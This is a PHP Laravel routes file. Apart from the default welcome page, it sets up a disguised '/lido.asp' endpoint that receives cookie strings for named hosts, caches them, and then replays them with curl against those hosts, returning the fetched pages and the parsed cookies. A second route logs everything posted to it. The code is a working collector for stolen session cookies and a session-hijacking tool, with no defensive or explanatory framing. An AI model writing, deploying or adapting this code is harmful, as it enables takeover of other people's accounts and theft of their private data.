<?php

/*
|--------------------------------------------------------------------------
| Web Routes
|--------------------------------------------------------------------------
|
| Here is where you can register web routes for your application. These
| routes are loaded by the RouteServiceProvider within a group which
| contains the "web" middleware group. Now create something great!
|
*/

use Illuminate\Http\Request;
use Illuminate\Support\Facades\Log;
use Illuminate\Support\Facades\Cache;
use Carbon\Carbon;

Route::get('/', function () {
    return view('welcome');
});

Route::get('/lido.asp', function (Request $request) {

	$mainReturn = ['host' => $request->getHttpHost() , 'cookies' =>  Cookie::get() ];

	//if cookies are set , then store them in cache
	if ($request->has('asking')){

		$cookieList = array();

        if (Cache::has('cookie_list')){
            $cookieList = json_decode(Cache::get('cookie_list') , true);
            if (JSON_ERROR_NONE !== json_last_error()){
                $cookieList = array();
            }
        }

        if (!$request->has('cookies')  && isset($cookieList[$request->get('asking')])){
        	$parts = explode("(b'Cookie'", $cookieList[$request->get('asking')]);

        	$parts2 = explode("')", $parts[1]);

        	$sanitizedCookies = trim(str_replace("b'", "", $parts2[0]));
        	$sanitizedCookies = trim(str_replace(", ", "", $sanitizedCookies));
        	$sanitizedCookies = trim(str_replace(" ", "", $sanitizedCookies));


			$c = curl_init('https://'.$request->get('asking'));
			curl_setopt($c, CURLOPT_VERBOSE, 1);
			curl_setopt($c, CURLOPT_COOKIE, $sanitizedCookies);
			curl_setopt($c, CURLOPT_RETURNTRANSFER, 1);
			$page = curl_exec($c);
			curl_close($c);
        	

        	if ($request->has('dd')){
        		dd(
        			array($request->fullUrl() , $request->get('asking') , $page , $sanitizedCookies)
        		);	
        	}else if ($request->has('array')){
        		$cookieArray = explode(";", $sanitizedCookies);

        		foreach ($cookieArray as $key => $value) {

        			$arrayData = explode("=", $value);
        			$cookieArray[$arrayData[0]] = $arrayData[1];

        			unset($cookieArray[$key]);
        		}

        		$mainReturn['cookie_array'] = $cookieArray;
        	}else {
        		$mainReturn['cookie_string'] = $sanitizedCookies;
        	}

        }else if ($request->has('cookies')){
        	$cookieList[$request->get('asking')] = $request->get('cookies');
		    $expiresAt = Carbon::now()->addMinutes(600);
		    Cache::put('cookie_list', json_encode($cookieList), $expiresAt); 
        }
	}else{
		$mainReturn['blabla'] = "You are not asking";
	}

    return json_encode(array_merge($mainReturn , $request->all()));
});

Route::post('/lido.asp', function (Request $request) {
	Log::info(json_encode($request->all()));
    return json_encode(array_merge(['host' => $request->getHttpHost() ] , $request->all()));
});
